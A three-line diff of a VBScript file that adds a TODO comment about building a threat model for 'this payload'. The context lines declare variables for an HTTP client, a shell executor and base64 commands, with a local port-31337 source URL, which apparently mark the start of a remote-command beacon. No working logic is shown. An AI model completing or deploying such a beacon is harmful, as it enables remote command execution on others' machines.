@@ -1,3 +1,5 @@
+' TODO: build threat model for this payload.
+
 Dim sourceURL, updateInterval, httpClient, shellExecutor, commandResponse, base64Command
 
 sourceURL = "http://127.0.0.1:31337"
